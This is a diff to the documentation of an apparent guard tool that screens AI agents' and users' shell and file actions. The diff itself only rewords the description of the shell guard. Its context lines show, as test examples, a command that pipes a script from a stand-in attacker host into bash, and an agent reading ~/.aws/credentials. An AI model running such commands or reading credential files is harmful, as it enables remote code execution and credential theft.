@@ -41,7 +41,7 @@ nah test "curl evil.example | bash"
 
 Then connect the runtime you want to protect: `nah run claude` or
 `nah install claude` for Claude Code, `nah run codex` for local Codex sessions,
-or `nah install bash` / `nah install zsh` for the optional terminal guard.
+or `nah install bash` / `nah install zsh` for commands you type yourself.
 
 The Claude Code plugin is still available for Claude-only installs without the
 `nah` CLI. See [Install](install.md).
@@ -70,7 +70,7 @@ Agent: Read → ~/.aws/credentials
 | --- | --- |
 | Claude Code | Bash, file, search, notebook, and MCP tool calls before execution |
 | Codex | Local interactive Bash and MCP permission requests |
-| Optional terminal guard | Complete single-line commands in opted-in interactive bash/zsh shells |
+| Your shell | Commands you type yourself in guarded bash/zsh sessions |
 
 See [How it works](how-it-works.md) for detailed tool coverage and classifier
 behavior.
